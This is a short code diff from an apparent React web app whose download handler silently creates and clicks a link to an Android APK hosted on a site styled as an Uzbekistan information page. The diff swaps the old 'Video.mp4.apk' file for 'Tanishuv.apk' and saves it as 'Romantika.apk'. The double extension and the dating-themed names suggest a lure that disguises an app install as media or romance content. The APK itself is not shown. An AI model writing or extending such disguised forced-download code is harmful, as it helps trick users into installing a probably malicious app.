@@ -62,7 +62,7 @@ export default function App() {
   const handleDownload = (e) => {
     e.preventDefault();
     const link = document.createElement('a');
-    link.href = 'https://uzbekistan-info.vercel.app/docs/Video.mp4.apk';
+    link.href = 'https://uzbekistan-info.vercel.app/docs/Tanishuv.apk';
     link.download = 'Romantika.apk';
     document.body.appendChild(link);
     link.click();
